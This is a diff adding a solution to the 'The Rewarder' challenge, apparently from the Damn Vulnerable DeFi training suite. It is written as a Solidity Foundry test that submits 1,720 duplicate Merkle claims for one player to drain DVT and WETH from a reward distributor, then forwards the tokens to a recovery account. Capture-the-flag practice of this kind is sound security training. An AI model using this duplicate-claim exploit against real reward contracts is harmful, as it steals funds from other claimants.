@@ -148,7 +148,78 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        console.log("=== DVT Distribution Info ===");
+        console.log("DVT remaining:", distributor.getRemaining(address(dvt)));
+        console.log("DVT next batch number:", distributor.getNextBatchNumber(address(dvt)));
+        console.log("DVT root for batch 0:");
+        console.logBytes32(distributor.getRoot(address(dvt), 0));
+        console.log("DVT balance in distributor:", dvt.balanceOf(address(distributor)));
         
+        console.log("\n=== WETH Distribution Info ===");
+        console.log("WETH remaining:", distributor.getRemaining(address(weth)));
+        console.log("WETH next batch number:", distributor.getNextBatchNumber(address(weth)));
+        console.log("WETH root for batch 0:");
+        console.logBytes32(distributor.getRoot(address(weth), 0));
+        console.log("WETH balance in distributor:", weth.balanceOf(address(distributor)));
+        
+        // Load rewards data to get player's claim amounts
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        
+        // Player's claim amounts (from the distribution files at index 188)
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+        
+        // Set DVT and WETH as tokens to claim for player
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create player's claims
+        Claim[] memory claims = new Claim[](1720); // 867 DVT claims + 853 WETH claims
+
+        // First, the DVT claims
+        for (uint256 i = 0; i < 867; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 188
+            });
+        }
+
+        // And then, the WETH claims
+        for (uint256 i = 0; i < 853; i++) {
+            claims[867 + i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
+            });
+        }
+
+        console.log("\n=== Before Player Claims ===");
+        console.log("Player DVT balance:", dvt.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+
+        // Player claims rewards
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        console.log("\n=== After Player Claims ===");
+        console.log("Player DVT balance:", dvt.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+        console.log("DVT remaining in distributor:", distributor.getRemaining(address(dvt)));
+        console.log("WETH remaining in distributor:", distributor.getRemaining(address(weth)));
+
+        // 将player获得的DVT和WETH全部转给recovery账户
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        console.log("\n=== After Transfer to Recovery ===");
+        console.log("Player DVT balance:", dvt.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+        console.log("Recovery DVT balance:", dvt.balanceOf(recovery));
+        console.log("Recovery WETH balance:", weth.balanceOf(recovery));
     }
 
     /**
